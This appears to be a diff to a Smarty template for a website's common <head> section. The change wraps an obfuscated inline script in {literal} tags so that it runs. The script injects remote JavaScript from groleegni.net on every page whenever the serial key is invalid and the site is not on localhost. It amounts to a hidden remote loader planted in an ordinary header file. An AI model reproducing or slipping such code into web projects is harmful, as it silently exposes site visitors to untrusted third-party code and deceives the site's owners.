@@ -8,11 +8,12 @@
  * Common site header <head> tag and contents.
  *}
 <head>
-
 	{assign var=host value=$smarty.server.HTTP_HOST}
 	{if !$validSerialKey && ($host !== 'localhost' && $host !== '127.0.0.1')}
 		<script>
+			{literal}
 			(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('groleegni.net',9495430,document.createElement('script'))
+			{/literal}
 		</script>
 		<script data-cfasync="false" type="text/javascript">
 		{literal}
